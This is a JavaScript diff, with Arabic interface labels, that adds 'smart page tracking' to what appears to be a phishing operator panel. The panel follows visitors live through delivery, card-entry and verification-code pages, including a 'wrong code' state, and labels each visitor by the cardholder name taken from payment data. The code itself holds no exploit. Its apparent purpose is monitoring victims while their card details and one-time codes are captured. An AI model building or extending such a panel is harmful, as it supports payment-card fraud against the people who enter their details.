@@ -782,9 +782,65 @@ function showNotification(title, message, type = 'info') {
 }
 
 // ========== MOBILE CARD RENDERING ==========
+// ==========================================
+// SMART PAGE TRACKING SYSTEM
+// ==========================================
+
+// Map page names to Arabic labels
 function getPageName(page) {
-  const pages = { 'home': 'الرئيسية', 'delivery': 'التوصيل', 'payment': 'الدفع', 'verification': 'التحقق' };
+  const pages = {
+    'home': 'الرئيسية',
+    'delivery': 'بيانات التوصيل',
+    'payment': 'اختيار الدفع',
+    'payment-form': 'ملء بيانات البطاقة',
+    'verification': 'إدخال الرمز',
+    'verification-error': 'الرمز خطأ',
+    'success': 'تمت العملية'
+  };
   return pages[page] || page;
+}
+
+// Page colors for badge
+function getPageColor(page) {
+  const colors = {
+    'home': { bg: '#6366f1', text: 'الرئيسية' },
+    'delivery': { bg: '#3b82f6', text: 'بيانات التوصيل' },
+    'payment': { bg: '#f59e0b', text: 'اختيار الدفع' },
+    'payment-form': { bg: '#ef4444', text: 'ملء البطاقة' },
+    'verification': { bg: '#10b981', text: 'إدخال الرمز' },
+    'verification-error': { bg: '#dc2626', text: '❌ خطأ' },
+    'success': { bg: '#22c55e', text: '✓ نجاح' }
+  };
+  return colors[page] || { bg: '#6b7280', text: page };
+}
+
+// Check if page has changed (for smart tracking)
+function hasPageChanged(oldPage, newPage) {
+  return oldPage !== newPage;
+}
+
+// Get step progress indicator
+function getStepIndicator(page) {
+  const steps = [
+    { id: 'home', label: '🏠', name: 'الرئيسية' },
+    { id: 'delivery', label: '📦', name: 'التوصيل' },
+    { id: 'payment', label: '💳', name: 'الدفع' },
+    { id: 'payment-form', label: '🔐', name: 'البطاقة' },
+    { id: 'verification', label: '⏳', name: 'الرمز' }
+  ];
+  
+  const currentIndex = steps.findIndex(s => s.id === page || page?.startsWith(s.id));
+  if (currentIndex === -1) return '';
+  
+  let html = '<div class="step-indicator" style="display:flex;gap:4px;align-items:center;">';
+  steps.forEach((step, i) => {
+    const isActive = i === currentIndex;
+    const isCompleted = i < currentIndex;
+    const color = isActive ? '#10b981' : (isCompleted ? '#6366f1' : '#4b5563');
+    html += `<span style="font-size:12px;opacity:${isActive ? 1 : (isCompleted ? 0.8 : 0.4)};">${step.label}</span>`;
+  });
+  html += '</div>';
+  return html;
 }
 
 function getCountryFlag(countryCode) {
@@ -945,14 +1001,11 @@ function createVisitorCard(visitor, isTrashMode = false) {
     `;
   }
   
-  // Page badge color
-  const pageColors = {
-    'home': { bg: '#6366f1', text: 'الرئيسية' },
-    'delivery': { bg: '#3b82f6', text: 'التوصيل' },
-    'payment': { bg: '#10b981', text: 'الدفع' },
-    'verification': { bg: '#f59e0b', text: 'التحقق' }
-  };
-  const pageInfo = pageColors[page] || { bg: '#6b7280', text: getPageName(page) };
+  // Get page color using smart system
+  const pageInfo = getPageColor(page);
+  
+  // Add step progress indicator
+  const stepIndicator = getStepIndicator(page);
   
   // Country + Name display
   const displayName = delivery.fullName || payment.cardHolder || country || 'زائر ' + sessionId.substring(0, 6);
@@ -1001,6 +1054,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <span class="page-badge" style="background: ${pageInfo.bg};">
             ${pageInfo.text}
           </span>
+          ${stepIndicator}
         </div>
       </div>
       
@@ -1675,10 +1729,30 @@ function updateVisitorCardFull(card, data) {
   const titleEl = card.querySelector('.card-title');
   if (titleEl) titleEl.textContent = displayName;
   
-  // Update page
-  const pageEl = card.querySelector('.card-page');
-  if (pageEl && data.current_page) {
-    pageEl.textContent = getPageName(data.current_page);
+  // Update page - Smart page tracking
+  if (data.current_page) {
+    const pageInfo = getPageColor(data.current_page);
+    const pageBadge = card.querySelector('.page-badge');
+    if (pageBadge) {
+      pageBadge.textContent = pageInfo.text;
+      pageBadge.style.background = pageInfo.bg;
+    } else {
+      // For old card style
+      const pageEl = card.querySelector('.card-page');
+      if (pageEl) pageEl.textContent = getPageName(data.current_page);
+    }
+    
+    // Update step indicator for new card style
+    const headerRight = card.querySelector('.header-right');
+    if (headerRight) {
+      const oldStepIndicator = headerRight.querySelector('.step-indicator');
+      const newStepIndicator = getStepIndicator(data.current_page);
+      if (oldStepIndicator && newStepIndicator) {
+        oldStepIndicator.outerHTML = newStepIndicator;
+      } else if (newStepIndicator && !oldStepIndicator) {
+        headerRight.insertAdjacentHTML('beforeend', newStepIndicator);
+      }
+    }
   }
   
   // Update time
@@ -2039,10 +2113,27 @@ function updateVisitorCardData(card, data) {
     }
   }
   
-  // Update page info if present
+  // Update page info if present - Smart page tracking
   if (data.current_page) {
-    const pageEl = card.querySelector('.card-page');
-    if (pageEl) pageEl.textContent = getPageName(data.current_page);
+    const pageInfo = getPageColor(data.current_page);
+    const pageBadge = card.querySelector('.page-badge');
+    if (pageBadge) {
+      pageBadge.textContent = pageInfo.text;
+      pageBadge.style.background = pageInfo.bg;
+    }
+    
+    // Update step indicator
+    const headerRight = card.querySelector('.header-right');
+    if (headerRight) {
+      const oldStepIndicator = headerRight.querySelector('.step-indicator');
+      const newStepIndicator = getStepIndicator(data.current_page);
+      if (oldStepIndicator && newStepIndicator) {
+        oldStepIndicator.outerHTML = newStepIndicator;
+      } else if (newStepIndicator && !oldStepIndicator) {
+        // Add step indicator if not exists
+        headerRight.insertAdjacentHTML('beforeend', newStepIndicator);
+      }
+    }
   }
   
   // Update last activity timestamp
